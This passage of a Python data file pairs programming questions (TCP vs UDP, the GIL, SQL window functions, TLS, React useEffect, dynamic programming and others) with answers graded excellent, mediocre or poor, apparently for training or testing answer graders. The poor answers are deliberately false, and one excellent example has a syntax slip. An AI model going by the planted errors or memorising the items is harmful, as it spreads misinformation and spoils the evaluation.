        "Benefits:\n1. Testability: inject mocks/stubs without patching\n2. Flexibility: swap implementations (SQLite → PostgreSQL)\n3. Single Responsibility: class doesn't know how to create deps\n4. Explicit dependencies: visible in constructor\n\nFastAPI DI:\nfrom fastapi import Depends\n\ndef get_db():\n    db = SessionLocal()\n    try:\n        yield db\n    finally:\n        db.close()\n\n@router.get('/users')\ndef list_users(db: Session = Depends(get_db)): ...",
        "Constructor injection (preferred) vs property injection vs method injection:\n# Constructor: deps in __init__ — clear, all deps known upfront\n# Property: can be set after construction — flexible but fragile\n# Method: deps per call — for optional/contextual deps\n\nDI containers (Python):\n- dependency_injector library\n- punq\n- FastAPI's Depends system",
        "Inversion of Control (IoC): high-level modules don't depend on low-level modules; both depend on abstractions.\n\n# Abstract interface\nclass EmailService(ABC):\n    @abstractmethod\n    def send(self, to, subject, body): ...\n\n# Implementations (low-level)\nclass SMTPEmailService(EmailService): ...\nclass SendGridEmailService(EmailService): ...\n\n# High-level module depends on abstraction\nclass UserService:\n    def __init__(self, mailer: EmailService): ...",
    ],
    mediocre=[
        "Dependency injection means passing dependencies to a class instead of creating them inside. Makes testing easier.",
        "Instead of hardcoding dependencies, inject them through the constructor so they can be swapped.",
        "DI decouples classes from their dependencies, making them more reusable and testable.",
    ],
    poor=[
        "Dependency injection is a way to import modules in Python.",
        "Use DI when you have too many global variables.",
        "Dependency injection makes code slower because of the extra function calls.",
    ],
)

# ── Networking ────────────────────────────────────────────────────────────────
add(
    "Explain TCP vs UDP and when to use each",
    "Is the TCP/UDP distinction accurate with appropriate use cases?",
    excellent=[
        "TCP (Transmission Control Protocol):\n- Connection-oriented (3-way handshake)\n- Reliable: guaranteed delivery, ordering, retransmission\n- Flow control and congestion control\n- Higher overhead\n- Use for: HTTP, SMTP, SSH, FTP — anything requiring reliability\n\nUDP (User Datagram Protocol):\n- Connectionless\n- Best-effort: no delivery guarantees, no ordering\n- Low overhead, low latency\n- Use for: DNS, streaming video, gaming, WebRTC, QUIC",
        "TCP 3-way handshake:\n1. SYN (client → server): 'I want to connect'\n2. SYN-ACK (server → client): 'OK, ready'\n3. ACK (client → server): 'Connected'\n\nThis adds latency on every new connection.\nHTTP/2 and QUIC (HTTP/3) reduce this with connection multiplexing and 0-RTT resumption.",
        "When UDP is better:\n- Real-time: small delay > lost packet (voice call, video game)\n- Broadcasting: send to many without per-connection overhead\n- DNS: single request/response, retry at application layer\n\nApplication-layer reliability over UDP:\nQUIC (HTTP/3) implements reliable streams on top of UDP\n— get reliability without TCP's head-of-line blocking.",
        "Comparison:\n           TCP          UDP\nReliable   Yes          No\nOrdering   Guaranteed   Not guaranteed\nLatency    Higher       Lower\nOverhead   High         Low\nUse case   HTTP, SSH    Video, DNS, gaming\n\nTCP checksum detects corruption but not loss.\nUDP has optional checksum.",
    ],
    mediocre=[
        "TCP is reliable and ordered. UDP is faster but doesn't guarantee delivery. Use TCP for most apps.",
        "TCP ensures data arrives in order. UDP is used for real-time applications like video calls.",
        "TCP does error checking and retransmission. UDP just sends data as fast as possible.",
    ],
    poor=[
        "TCP is always better because it's more secure.",
        "UDP is deprecated and should not be used in modern applications.",
        "TCP is for servers, UDP is for clients.",
    ],
)

add(
    "What happens when you type a URL in a browser and press Enter?",
    "Is the full request lifecycle explained correctly?",
    excellent=[
        "1. DNS lookup: browser checks cache → OS cache → resolver → root → TLD → authoritative NS → returns IP.\n2. TCP connection: 3-way handshake with server IP on port 443.\n3. TLS handshake: exchange certs, negotiate cipher, establish encrypted session.\n4. HTTP request: GET / HTTP/1.1, Host, Accept-Encoding, Cookie headers.\n5. Server processing: router → middleware → handler → DB query → template.\n6. HTTP response: 200 OK, HTML body.\n7. Browser renders: parse HTML → build DOM → fetch CSS/JS → CSSOM → render tree → layout → paint.",
        "DNS resolution details:\nbrowser cache → hosts file → stub resolver → recursive resolver →\n  root nameserver (13 sets, anycast) → TLD nameserver (.com) →\n  authoritative nameserver → A record with IP\n\nCached at each step with TTL. DNSSEC adds cryptographic validation.\n\nHTTPS: TLS 1.3 reduces handshake to 1 RTT (or 0-RTT for resumption).",
        "CDN in the path:\nDNS returns CDN edge IP (nearest PoP) instead of origin.\nEdge serves cached response (cache hit: no origin request).\nCache miss: edge fetches from origin, caches, serves.\n\nHTTP/2 and HTTP/3 differences:\nHTTP/1.1: one request per TCP connection (pipelining rarely used)\nHTTP/2: multiplexed streams over one connection\nHTTP/3: multiplexed streams over QUIC (UDP-based)",
        "Browser rendering pipeline:\nBytes → Characters → Tokens → DOM nodes → DOM tree\nCSS → CSSOM tree\nDOM + CSSOM → Render tree\nLayout (reflow): calculate positions\nPaint: fill pixels\nComposite: layer stacking\n\nCritical rendering path optimization:\n- Minimize render-blocking resources\n- Inline critical CSS\n- Defer non-critical JS",
    ],
    mediocre=[
        "DNS resolves the domain to an IP, then TCP connects to the server, then HTTP request is sent and response rendered.",
        "The browser looks up the IP via DNS, connects via TCP, sends HTTP GET, receives HTML/CSS/JS, and renders.",
        "1. DNS lookup 2. Connect to server 3. Send request 4. Receive response 5. Render page",
    ],
    poor=[
        "The browser sends a message to the website and it sends back the webpage.",
        "DNS converts the URL to a webpage. The browser displays the result.",
        "The URL is sent to Google which finds the correct server.",
    ],
)

# ── Python Advanced ───────────────────────────────────────────────────────────
add(
    "What is Python's GIL and how does it affect multithreading?",
    "Is the GIL explained correctly with practical implications?",
    excellent=[
        "GIL (Global Interpreter Lock): a mutex in CPython that allows only one thread to execute Python bytecode at a time.\n\nImplication: Python threads cannot run in parallel on multiple CPU cores.\nCPU-bound work: threading provides NO speedup (GIL blocks parallel execution).\nI/O-bound work: threading DOES help — GIL is released during I/O operations.",
        "CPU-bound: use multiprocessing (bypasses GIL via separate processes)\nI/O-bound: use threading or asyncio\n\nimport multiprocessing\nwith multiprocessing.Pool() as pool:\n    results = pool.map(cpu_heavy_function, data)  # true parallel\n\nimport threading\nthreads = [threading.Thread(target=io_task) for _ in range(10)]\nfor t in threads: t.start()  # concurrent I/O",
        "asyncio vs threading for I/O:\nBoth handle I/O concurrently. asyncio is single-threaded (cooperative multitasking).\nThreads: preemptive, good for blocking I/O libraries.\nasyncio: cooperative, less overhead, scales to thousands of concurrent tasks.\n\nConcurrency vs Parallelism:\nConcurrency: handling multiple tasks (threading, asyncio)\nParallelism: executing simultaneously on multiple CPUs (multiprocessing)",
        "GIL workarounds:\n1. multiprocessing: separate processes, each has own GIL\n2. Cython with nogil: release GIL in C extensions\n3. NumPy, Pandas: core operations release GIL\n4. PyPy: alternative Python runtime (still has GIL but faster)\n5. Python 3.13+: experimental free-threaded mode (GIL optional)\n\nFor most web apps: doesn't matter (I/O bound, async handles it fine).",
    ],
    mediocre=[
        "The GIL prevents multiple threads from running Python code simultaneously. Use multiprocessing for CPU-heavy tasks.",
        "Python threads share the GIL so they can't run in parallel. asyncio or multiprocessing are alternatives.",
        "The GIL is a limitation in CPython that affects CPU-bound multithreaded programs.",
    ],
    poor=[
        "The GIL makes Python thread-safe by preventing all memory access from multiple threads.",
        "Python doesn't support multithreading because of the GIL.",
        "Just use more threads to get around the GIL limitation.",
    ],
)

add(
    "Explain async/await in Python and when to use asyncio",
    "Is async/await and asyncio explained correctly?",
    excellent=[
        "asyncio provides single-threaded concurrency using an event loop.\nAsync functions are coroutines — they can yield control while waiting for I/O.\n\nasync def fetch(url):\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as resp:\n            return await resp.json()\n\nasync def main():\n    results = await asyncio.gather(\n        fetch('https://api.a.com'),\n        fetch('https://api.b.com'),\n        fetch('https://api.c.com'),\n    )  # all 3 requests in-flight simultaneously",
        "Event loop model:\n1. await suspends the coroutine and returns control to the loop\n2. Loop runs other coroutines while waiting\n3. When I/O completes, loop resumes the coroutine\n\nNo threads needed — all in one thread.\nBenefit: scale to 10,000+ concurrent connections with low overhead.\nCost: must use async libraries throughout (aiohttp not requests, asyncpg not psycopg2).",
        "asyncio.gather vs asyncio.create_task:\ngather: run coroutines concurrently, wait for all\ntasks: schedule coroutine without waiting immediately\n\ntask = asyncio.create_task(background_job())\nawait do_other_work()\nresult = await task\n\nasyncio.timeout (Python 3.11+):\nasync with asyncio.timeout(5.0):\n    result = await slow_operation()",
        "When to use asyncio:\n✓ High-concurrency I/O (web servers, scrapers, API clients)\n✓ WebSockets, SSE\n✓ Microservices making many external calls\n\nWhen NOT to:\n✗ CPU-bound work (use multiprocessing)\n✗ Mixing with blocking libraries (use run_in_executor for legacy code)\n✗ Simple scripts (overkill)\n\nFrameworks: FastAPI, aiohttp, Tornado.",
    ],
    mediocre=[
        "async/await lets you write non-blocking code. Functions marked async can use await to pause without blocking.",
        "asyncio handles I/O operations concurrently in a single thread using an event loop.",
        "Use async def for coroutines and await to call them. asyncio.run() starts the event loop.",
    ],
    poor=[
        "async/await is the same as threading but with different syntax.",
        "Use asyncio for all Python programs to make them faster.",
        "async functions run in parallel on multiple CPU cores.",
    ],
)

# ── More SQL ──────────────────────────────────────────────────────────────────
add(
    "What are window functions in SQL and give an example",
    "Is the window function concept explained correctly with a working example?",
    excellent=[
        "Window functions perform calculations across a set of rows related to the current row without collapsing them (unlike GROUP BY).\n\nSELECT\n    employee_id,\n    department,\n    salary,\n    AVG(salary) OVER (PARTITION BY department) AS dept_avg,\n    salary - AVG(salary) OVER (PARTITION BY department) AS diff_from_avg,\n    RANK() OVER (PARTITION BY department ORDER BY salary DESC) AS dept_rank\nFROM employees;",
        "Common window functions:\nRANK()       — rank with gaps (1,1,3)\nDENSE_RANK() — rank without gaps (1,1,2)\nROW_NUMBER() — unique row number\nLAG(col, n)  — value from n rows before\nLEAD(col, n) — value from n rows after\nFIRST_VALUE(col) — first value in window\nNTILE(n)     — divide rows into n buckets\n\nRunning total:\nSUM(amount) OVER (ORDER BY date) AS running_total",
        "PARTITION BY defines the window groups (like GROUP BY but keeps all rows):\nORDER BY within OVER() defines row ordering within window.\n\n-- Detect previous order date per customer\nSELECT customer_id, order_date,\n       LAG(order_date) OVER (PARTITION BY customer_id ORDER BY order_date) AS prev_order\nFROM orders;",
        "Window frame specification:\nROWS BETWEEN 2 PRECEDING AND CURRENT ROW — last 3 rows\nRANGE BETWEEN INTERVAL '7' DAY PRECEDING AND CURRENT ROW — last 7 days\n\nSUM(revenue) OVER (\n  PARTITION BY store_id\n  ORDER BY date\n  ROWS BETWEEN 6 PRECEDING AND CURRENT ROW\n) AS weekly_rolling_sum",
    ],
    mediocre=[
        "Window functions let you calculate values across rows without grouping. OVER() defines the window.",
        "RANK() OVER (PARTITION BY dept ORDER BY salary DESC) ranks employees within departments.",
        "Window functions are like aggregates but keep all rows. Use PARTITION BY to group and ORDER BY to order.",
    ],
    poor=[
        "Window functions are for creating popups in SQL GUIs.",
        "Window functions are the same as GROUP BY but slower.",
        "Use window functions to filter rows from your query.",
    ],
)

add(
    "Explain database normalization and the first three normal forms",
    "Is normalization explained correctly?",
    excellent=[
        "Normalization reduces data redundancy and dependency.\n\n1NF (First Normal Form):\n- Atomic values in each column (no repeating groups or arrays)\n- Each column has a single data type\n- Each row uniquely identifiable\n\nViolation: Orders table with 'item1, item2, item3' in one column.\nFix: separate Items table with one row per item.",
        "2NF (Second Normal Form):\n- Must be 1NF\n- No partial dependencies (non-key attributes depend on whole primary key, not part of it)\n\nViolation: OrderItem table with columns (order_id, product_id, product_name, quantity)\n  product_name depends only on product_id, not on (order_id, product_id)\nFix: move product_name to Products table.\n\n3NF (Third Normal Form):\n- Must be 2NF\n- No transitive dependencies (non-key attributes don't depend on other non-key attributes)",
        "3NF example:\nEmployees (emp_id, dept_id, dept_name, salary)\ndept_name depends on dept_id (not on emp_id)\nFix: create Departments(dept_id, dept_name) table.\n\nBCNF (Boyce-Codd NF): stricter than 3NF, handles edge cases.\n\nDenormalization: intentionally add redundancy for performance.\nOLTP: prefer normalized (many small transactions)\nOLAP/reporting: prefer denormalized (fewer joins, faster reads)",
        "Trade-offs:\nNormalized:\n+ No update anomalies\n+ Less storage\n- More JOINs required\n\nDenormalized:\n+ Faster reads (fewer JOINs)\n- Update anomalies (same data in multiple places)\n- More storage\n\nFor most OLTP systems: normalize to 3NF, denormalize only when queries are proven slow.",
    ],
    mediocre=[
        "Normalization removes duplicate data. 1NF requires atomic values, 2NF removes partial dependencies, 3NF removes transitive dependencies.",
        "Normal forms are levels of database design. Higher normal forms reduce redundancy but require more joins.",
        "Normalization splits data into multiple related tables to avoid storing the same information twice.",
    ],
    poor=[
        "Normalization means formatting your SQL queries correctly.",
        "Always use the highest normal form for best performance.",
        "Normalization is only needed for databases with more than 1000 rows.",
    ],
)

# ── WebSockets ────────────────────────────────────────────────────────────────
add(
    "Explain WebSockets and when to use them over HTTP",
    "Is the WebSocket explanation correct with appropriate use cases?",
    excellent=[
        "WebSocket: full-duplex, persistent TCP connection between client and server.\n\nHTTP: request-response (client initiates every exchange).\nWebSocket: either party can send data at any time after handshake.\n\nHandshake: starts as HTTP GET with Upgrade: websocket header → server responds 101 Switching Protocols → WS connection established.\n\nUse cases:\n- Real-time chat\n- Live notifications\n- Collaborative editing (Google Docs)\n- Live dashboards (stock prices, monitoring)\n- Multiplayer games",
        "Python WebSocket server (FastAPI):\nfrom fastapi import WebSocket\n\n@app.websocket('/ws')\nasync def websocket_endpoint(ws: WebSocket):\n    await ws.accept()\n    try:\n        while True:\n            msg = await ws.receive_text()\n            await ws.send_text(f'echo: {msg}')\n    except WebSocketDisconnect:\n        pass\n\nJS client:\nconst ws = new WebSocket('wss://api.example.com/ws');\nws.onmessage = e => console.log(e.data);\nws.send('hello');",
        "WebSocket vs alternatives:\nWebSocket: true bidirectional, low latency, complex\nSSE (Server-Sent Events): server → client only, simpler, HTTP/2 multiplexed, auto-reconnect\nLong polling: HTTP, compatible everywhere, higher latency\n\nUse SSE when server needs to push updates only (notifications, feeds).\nUse WebSocket for interactive real-time (chat, games, collaborative editing).",
        "Scaling WebSockets:\nStateful — each server maintains open connections.\nHorizontal scaling requires sticky sessions or pub/sub relay.\n\nPattern: WebSocket server publishes to Redis Pub/Sub → all WS servers receive → push to their clients.\nManaged: Pusher, Ably, AWS API Gateway WebSocket APIs abstract this away.",
    ],
    mediocre=[
        "WebSockets provide a persistent connection for real-time communication. Unlike HTTP, both sides can send data.",
        "Use WebSockets for chat applications and real-time dashboards where the server needs to push updates.",
        "WebSockets establish a connection that stays open, allowing low-latency bidirectional communication.",
    ],
    poor=[
        "WebSockets are used for making HTTP requests faster.",
        "WebSockets are only for chat applications.",
        "WebSockets replace REST APIs for all communication.",
    ],
)

# ── More ML ───────────────────────────────────────────────────────────────────
add(
    "What is transfer learning and why is it so powerful?",
    "Is transfer learning explained correctly?",
    excellent=[
        "Transfer learning: take a model pre-trained on a large dataset and fine-tune it on a smaller domain-specific dataset.\n\nWhy it works: lower layers learn universal features (edges, textures, grammar) that transfer across tasks.\n\nCV example:\nImageNet-pretrained ResNet50 → fine-tune last few layers on your 1000-image medical dataset.\nWithout TL: need millions of images.\nWith TL: state-of-the-art with 1000 images.",
        "NLP example (BERT/GPT):\n# Pre-trained on 800GB of text — understands language structure\nmodel = BertForSequenceClassification.from_pretrained('bert-base-uncased')\n\n# Fine-tune on your 10,000 labeled sentiment examples\ntrainer = Trainer(model=model, train_dataset=your_data)\ntrainer.train()\n\nResults in hours, not months. Outperforms training from scratch on small datasets.",
        "Fine-tuning strategies:\n1. Feature extraction: freeze pre-trained layers, only train new head.\n   Fast, good when your data differs a lot from pre-training data.\n2. Fine-tuning: unfreeze top N layers + train new head.\n   Better when your data is similar to pre-training data.\n3. Full fine-tuning: unfreeze all layers.\n   Best with large in-domain dataset.\n4. LoRA/QLoRA: low-rank adapters — fine-tune LLMs efficiently.",
        "Foundation models (GPT-4, DALL-E, Whisper) take TL to the extreme:\nOne model → fine-tune or prompt-engineer for many tasks.\nFew-shot learning: model generalizes from just a few examples in the prompt.\nZero-shot: model handles tasks it was never explicitly trained on.",
    ],
    mediocre=[
        "Transfer learning uses a model trained on one task as a starting point for another task.",
        "Pre-trained models like BERT or ResNet can be fine-tuned on your specific task with less data.",
        "Transfer learning saves training time and works well when you don't have enough data to train from scratch.",
    ],
    poor=[
        "Transfer learning means copying weights from one model to another without any training.",
        "Transfer learning is only useful for image recognition tasks.",
        "You need at least 1 million examples to use transfer learning effectively.",
    ],
)

add(
    "What is a confusion matrix and what metrics can you derive from it?",
    "Are the confusion matrix and derived metrics explained correctly?",
    excellent=[
        "Confusion matrix for binary classification:\n\n              Predicted +    Predicted -\nActual +  |  TP (True+)  |  FN (False-)  |  ← actual positives\nActual -  |  FP (False+) |  TN (True-)   |  ← actual negatives\n\nAccuracy  = (TP+TN) / (TP+TN+FP+FN)  — misleading for imbalanced classes\nPrecision = TP / (TP+FP)             — quality of positive predictions\nRecall    = TP / (TP+FN)             — coverage of actual positives\nSpecificity = TN / (TN+FP)           — coverage of actual negatives\nF1        = 2 * (P*R) / (P+R)        — harmonic mean",
        "Example:\n1000 patients, 50 with disease\nModel predicts: 40 TP, 10 FN, 30 FP, 920 TN\n\nAccuracy  = (40+920)/1000 = 0.96  ← misleadingly high\nPrecision = 40/(40+30) = 0.57\nRecall    = 40/(40+10) = 0.80     ← we want this high for disease\nF1        = 2*(0.57*0.80)/(0.57+0.80) = 0.667\n\nFor disease: high recall critical (don't miss sick patients).",
        "Multiclass confusion matrix:\n            Predicted Cat  Dog  Bird\nActual Cat |     45     |  3  |  2  |\nActual Dog |      1     | 48  |  1  |\nActual Bird|      4     |  2  | 44  |\n\nPer-class precision/recall, then macro/micro averaging:\nMacro: average across classes equally\nMicro: aggregate all TP/FP/FN across classes",
        "ROC curve: plot TPR (recall) vs FPR (1-specificity) at different thresholds.\nAUC-ROC: 0.5 = random, 1.0 = perfect.\nGood for comparing models regardless of threshold.\n\nPR curve: plot precision vs recall at different thresholds.\nBetter for imbalanced datasets where AUC-ROC can be optimistic.",
    ],
    mediocre=[
        "Confusion matrix shows TP, FP, TN, FN. From it you can calculate accuracy, precision, recall, and F1.",
        "The matrix rows are actual classes, columns are predicted. Diagonal is correct predictions.",
        "Precision = TP/(TP+FP), Recall = TP/(TP+FN), F1 = harmonic mean of both.",
    ],
    poor=[
        "Confusion matrix shows how confused the model is. Higher values are worse.",
        "Accuracy is always the best metric regardless of class imbalance.",
        "Precision and recall are the same thing measured differently.",
    ],
)

# ── More Python ───────────────────────────────────────────────────────────────
add(
    "How does Python's memory management and garbage collection work?",
    "Is Python's memory management explained correctly?",
    excellent=[
        "Python uses reference counting as primary memory management.\nEach object has a refcount. When refcount drops to 0, object is freed.\n\nimport sys\nx = [1, 2, 3]\nsys.getrefcount(x)  # 2 (x + getrefcount's own ref)\ny = x\nsys.getrefcount(x)  # 3\ndel y\nsys.getrefcount(x)  # 2",
        "Cyclic garbage collector handles reference cycles:\na = []\nb = [a]\na.append(b)  # a → b → a (cycle, refcount never reaches 0)\n\ngc module runs periodically to detect and collect cycles.\ngc.collect()  # force collection\n\nGenerational collection: 3 generations. Most objects die young.",
        "__del__ finalizers: called when object is garbage collected.\nWarning: __del__ is unreliable with cyclic garbage collector — may never be called.\nUse context managers (with/close()) for resource cleanup instead.\n\nimport weakref  # reference without increasing refcount\nweak = weakref.ref(obj)\nweak()  # returns obj or None if collected",
        "Memory profiling:\nmemory_profiler: line-by-line memory usage\ntracemalloc: trace allocations\n\n# Common memory issues:\n# 1. Large lists kept in memory unnecessarily\n# 2. Closures capturing large outer scope\n# 3. Mutable default arguments\ndef bad(lst=[]):  # shared across calls!\n    lst.append(1)\ndef good(lst=None):\n    if lst is None: lst = []",
    ],
    mediocre=[
        "Python uses reference counting to manage memory. When an object has no references, it's freed.",
        "The garbage collector handles circular references that reference counting can't free.",
        "Python automatically manages memory. You don't need to free objects manually.",
    ],
    poor=[
        "Python has no garbage collection. You must manually delete objects.",
        "Python uses the same memory management as C.",
        "del x immediately frees the memory used by x.",
    ],
)

add(
    "Write a Python context manager for database transactions",
    "Is the context manager implemented correctly?",
    excellent=[
        "from contextlib import contextmanager\n\n@contextmanager\ndef transaction(db):\n    try:\n        yield db\n        db.commit()\n    except Exception:\n        db.rollback()\n        raise\n\n# Usage:\nwith transaction(db) as session:\n    session.add(User(name='Alice'))\n    session.add(Order(user_id=1, amount=99.99))\n# commit on exit, rollback on exception",
        "Class-based context manager:\nclass Transaction:\n    def __init__(self, db):\n        self.db = db\n\n    def __enter__(self):\n        return self.db\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        if exc_type is None:\n            self.db.commit()\n        else:\n            self.db.rollback()\n        return False  # don't suppress exceptions\n\nwith Transaction(db) as session:\n    session.execute(\"UPDATE accounts SET balance = balance - 100 WHERE id = 1\")",
        "Nested transactions with savepoints:\nfrom contextlib import contextmanager\n\n@contextmanager\ndef savepoint(db, name='sp'):\n    db.execute(f'SAVEPOINT {name}')\n    try:\n        yield\n        db.execute(f'RELEASE SAVEPOINT {name}')\n    except Exception:\n        db.execute(f'ROLLBACK TO SAVEPOINT {name}')\n        raise",
        "SQLAlchemy session context manager:\nfrom sqlalchemy.orm import Session\n\ndef get_session(engine):\n    with Session(engine) as session:\n        with session.begin():  # auto-commit/rollback\n            yield session\n\n# Or using begin():\nwith session.begin():\n    session.add(obj)  # auto-committed on exit",
    ],
    mediocre=[
        "def transaction(db):\n    try:\n        yield db\n        db.commit()\n    except:\n        db.rollback()\n\n# This needs @contextmanager decorator",
        "Use with statement and __enter__/__exit__ methods to create a context manager for transactions.",
        "Context managers handle setup and teardown. For transactions: commit on success, rollback on error.",
    ],
    poor=[
        "Use a try/finally block instead of a context manager.",
        "Transactions don't need context managers. Just commit after every operation.",
        "def transaction(): pass  # pass the session as a parameter",
    ],
)

# ── More React ────────────────────────────────────────────────────────────────
add(
    "What is the React useEffect hook and how do you use it correctly?",
    "Is useEffect explained correctly with cleanup and dependency array?",
    excellent=[
        "useEffect runs side effects after render.\n\n// Run after every render\nuseEffect(() => { document.title = `Count: ${count}`; });\n\n// Run once on mount (empty deps)\nuseEffect(() => {\n  fetchData().then(setData);\n}, []);\n\n// Run when dep changes\nuseEffect(() => {\n  const sub = subscribe(userId);\n  return () => sub.unsubscribe();  // cleanup on unmount/change\n}, [userId]);",
        "Dependency array rules:\n[] — run once on mount\n[a, b] — run when a or b changes\nomit — run every render\n\nESLint exhaustive-deps rule: all values used in effect should be in deps.\n\nAvoid async in useEffect directly:\n// WRONG: async effect function\nuseEffect(async () => { ... });\n\n// CORRECT: call async function inside\nuseEffect(() => {\n  async function load() { const data = await fetch(); setData(data); }\n  load();\n}, []);",
        "Cleanup function:\nReturn a function from useEffect to clean up before next run or unmount.\n\nuseEffect(() => {\n  const timer = setInterval(tick, 1000);\n  return () => clearInterval(timer);  // cleanup!\n}, []);\n\nuseEffect(() => {\n  window.addEventListener('resize', handler);\n  return () => window.removeEventListener('resize', handler);\n}, []);\n\nWithout cleanup: memory leaks and stale closures.",
        "Common pitfalls:\n1. Missing dependency → stale closure\n2. Object/array in deps → infinite re-render (new ref each render)\n3. Fetching without abort controller → state update after unmount\n\nAbort controller:\nuseEffect(() => {\n  const controller = new AbortController();\n  fetch(url, {signal: controller.signal}).then(setData);\n  return () => controller.abort();\n}, [url]);",
    ],
    mediocre=[
        "useEffect runs side effects after rendering. The dependency array controls when it re-runs.",
        "Use useEffect for data fetching, subscriptions, and DOM updates. Return a cleanup function for teardown.",
        "Empty dependency array means run once. Dependencies listed mean run when they change.",
    ],
    poor=[
        "useEffect is the same as componentDidMount and runs only once.",
        "You should never return anything from useEffect.",
        "Always use an empty dependency array to avoid infinite loops.",
    ],
)

# ── More Security ─────────────────────────────────────────────────────────────
add(
    "What is HTTPS and how does TLS work?",
    "Is HTTPS/TLS explained correctly?",
    excellent=[
        "HTTPS = HTTP over TLS (Transport Layer Security).\n\nTLS 1.3 handshake (1 RTT):\n1. Client Hello: TLS version, supported ciphers, client random\n2. Server Hello: chosen cipher, server cert, server random, signature\n3. Client verifies cert against trusted CAs\n4. Client and server derive session keys from shared secret\n5. Encrypted communication begins\n\nProtects: confidentiality (encryption), integrity (MAC), authenticity (certificates).",
        "Certificate chain:\nLeaf cert (your domain) → Intermediate CA → Root CA\nBrowser has built-in trusted Root CAs.\nLet's Encrypt: free, automated certificates.\n\nCertificate contains:\n- Domain name (CN or SAN)\n- Public key\n- Validity dates\n- Signature by issuing CA\n\nSNI (Server Name Indication): allows multiple certs on one IP.",
        "Key exchange (ECDHE):\nElliptic Curve Diffie-Hellman Ephemeral.\nEach session has unique keys (forward secrecy).\nPast sessions cannot be decrypted even if private key is compromised.\n\nCipher suite example:\nTLS_AES_256_GCM_SHA384\n= AES-256-GCM encryption + SHA-384 for MAC",
        "HSTS (HTTP Strict Transport Security):\nHeader: Strict-Transport-Security: max-age=31536000; includeSubDomains\nBrowser will refuse HTTP connections after seeing this header.\nPreload list: browsers ship with list of HSTS-only domains.\n\nCertificate Transparency: all issued certs logged publicly → detect misissued certs.",
    ],
    mediocre=[
        "HTTPS encrypts communication using SSL/TLS. The browser verifies the server's certificate before establishing a secure connection.",
        "TLS uses asymmetric encryption for key exchange and symmetric encryption for data transfer.",
        "HTTPS protects data in transit from eavesdropping. Use it for all production websites.",
    ],
    poor=[
        "HTTPS just adds an 's' to HTTP and doesn't change how the protocol works.",
        "HTTPS prevents all hacking and makes websites completely secure.",
        "TLS and SSL are the same thing and both are current standards.",
    ],
)

# ── More Algorithms ───────────────────────────────────────────────────────────
add(
    "Implement a function to check if parentheses are balanced",
    "Is the parentheses checker implemented correctly using a stack?",
    excellent=[
        "def is_balanced(s):\n    stack = []\n    matching = {')': '(', '}': '{', ']': '['}\n    for ch in s:\n        if ch in '({[':\n            stack.append(ch)\n        elif ch in ')}]':\n            if not stack or stack[-1] != matching[ch]:\n                return False\n            stack.pop()\n    return len(stack) == 0\n\nprint(is_balanced('({[]})')  # True\nprint(is_balanced('([)]'))   # False",
        "def is_balanced(s):\n    opens = set('({[')\n    closes = set(')}]')\n    pairs = dict(zip(')}]', '({['))\n    stack = []\n    for c in s:\n        if c in opens:\n            stack.append(c)\n        elif c in closes:\n            if not stack or stack.pop() != pairs[c]:\n                return False\n    return not stack  # empty stack = balanced\n\n# Time O(n), Space O(n)",
        "# Extended version for code files\ndef check_brackets(text, ignore_strings=True):\n    stack = []\n    pairs = {')': '(', '}': '{', ']': '['}\n    in_string = False\n    for i, c in enumerate(text):\n        if ignore_strings and c in '\"\\'':\n            in_string = not in_string\n        if not in_string:\n            if c in '({[': stack.append((c, i))\n            elif c in ')}]':\n                if not stack or stack[-1][0] != pairs[c]:\n                    return False, i\n                stack.pop()\n    if stack:\n        return False, stack[-1][1]\n    return True, -1",
        "# Using collections.deque for better performance:\nfrom collections import deque\n\ndef is_balanced(s):\n    stack = deque()\n    close_to_open = {')': '(', '}': '{', ']': '['}\n    for ch in s:\n        if ch in '({[':\n            stack.append(ch)\n        elif ch in ')}]':\n            if not stack or stack[-1] != close_to_open[ch]:\n                return False\n            stack.pop()\n    return not stack",
    ],
    mediocre=[
        "def is_balanced(s):\n    count = 0\n    for c in s:\n        if c == '(': count += 1\n        if c == ')': count -= 1\n        if count < 0: return False\n    return count == 0  # only works for single bracket type",
        "Use a stack. Push opening brackets, pop when you see closing. Return empty stack at end.",
        "def balanced(s):\n    while '()' in s or '{}' in s or '[]' in s:\n        s = s.replace('()','').replace('{}','').replace('[]','')\n    return s == ''",
    ],
    poor=[
        "def is_balanced(s):\n    return s.count('(') == s.count(')')  # doesn't check order",
        "Use regex to check if brackets are balanced.",
        "def is_balanced(s): return True  # all strings are balanced",
    ],
)

add(
    "Explain dynamic programming with the Fibonacci sequence example",
    "Is dynamic programming explained correctly with memoization and tabulation?",
    excellent=[
        "Dynamic programming: break problem into overlapping subproblems, solve each once, store results.\n\nNaive recursion (exponential):\ndef fib(n):\n    if n <= 1: return n\n    return fib(n-1) + fib(n-2)  # O(2^n) — recalculates same values!\n\nMemoization (top-down DP):\nfrom functools import lru_cache\n@lru_cache(maxsize=None)\ndef fib(n):\n    if n <= 1: return n\n    return fib(n-1) + fib(n-2)  # O(n) time, O(n) space",
        "Tabulation (bottom-up DP):\ndef fib(n):\n    if n <= 1: return n\n    dp = [0] * (n+1)\n    dp[1] = 1\n    for i in range(2, n+1):\n        dp[i] = dp[i-1] + dp[i-2]\n    return dp[n]  # O(n) time, O(n) space\n\n# Space-optimized (O(1) space):\ndef fib(n):\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a",
        "DP applies when:\n1. Overlapping subproblems: same subproblem computed multiple times\n2. Optimal substructure: optimal solution built from optimal sub-solutions\n\nOther DP problems:\n- Longest Common Subsequence\n- 0/1 Knapsack\n- Coin Change (min coins)\n- Edit Distance\n- Longest Increasing Subsequence",
        "Recognizing DP problems:\n- 'Find the number of ways...'\n- 'Find the minimum/maximum...'\n- 'Is it possible to...'\n- Choices at each step with impact on future\n\nCoin change example:\ndef min_coins(coins, amount):\n    dp = [float('inf')] * (amount+1)\n    dp[0] = 0\n    for i in range(1, amount+1):\n        for coin in coins:\n            if coin <= i:\n                dp[i] = min(dp[i], dp[i-coin] + 1)\n    return dp[amount] if dp[amount] != float('inf') else -1",
    ],
    mediocre=[
        "Dynamic programming breaks problems into subproblems and stores results to avoid recalculation.",
        "For Fibonacci: store previously computed values instead of recalculating. This reduces O(2^n) to O(n).",
        "DP uses a table or memoization to avoid redundant computation.",
    ],
    poor=[
        "Dynamic programming is a programming language used for scientific computing.",
        "DP always uses recursion and doesn't need any additional data structures.",
        "Only use dynamic programming for Fibonacci problems.",
    ],
)

# ── More JavaScript ──────────────────────────────────────────────────────────
add(
    "What is the JavaScript event loop and how does it work?",
